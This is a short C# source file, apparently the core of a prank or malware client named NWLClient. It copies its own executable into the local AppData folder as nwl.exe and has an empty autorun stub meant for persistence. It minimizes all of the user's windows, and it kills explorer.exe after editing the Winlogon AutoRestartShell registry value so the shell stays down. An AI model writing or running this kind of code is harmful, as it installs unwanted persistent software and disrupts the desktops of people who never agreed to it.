using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

namespace NWLClient
{
    class FunBeginsHere
    {
        const int WM_COMMAND = 0x111;
        const int MIN_ALL = 419;
        const int MIN_ALL_UNDO = 416; // unused

        static string currentPath = AppDomain.CurrentDomain.BaseDirectory; // currentPath does have trailing backslash!
        static string currentFile = Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);
        static string appDataPath = Environment.GetEnvironmentVariable("localappdata");

        public static bool ShouldCopyToAppData()
        {
            return currentPath + currentFile != appDataPath + @"\nwl.exe";
        }

        public static void CopyToAppData()
        {
            File.Copy(currentPath + currentFile, appDataPath + @"\nwl.exe", true);
        }

        public static void AddToAutorun()
        {

        }

        public static void MinimizeWindows()
        {
            IntPtr lHwnd = NativeMethods.FindWindow("Shell_TrayWnd", null);
            NativeMethods.SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
        }

        public static void KillExplorer()
        {
            RegistryKey SoftwareKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE");
            RegistryKey ars = SoftwareKey.OpenSubKey(@"Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            ars.SetValue("AutoRestartShell", 0);
            try
            {
                foreach (Process proc in Process.GetProcessesByName("explorer"))
                {
                    proc.Kill();
                }
            } catch (Exception) { }
            finally
            {
                Thread.Sleep(100);
                ars.SetValue("AutoRestartShell", 1);
            }
        }
    }
}
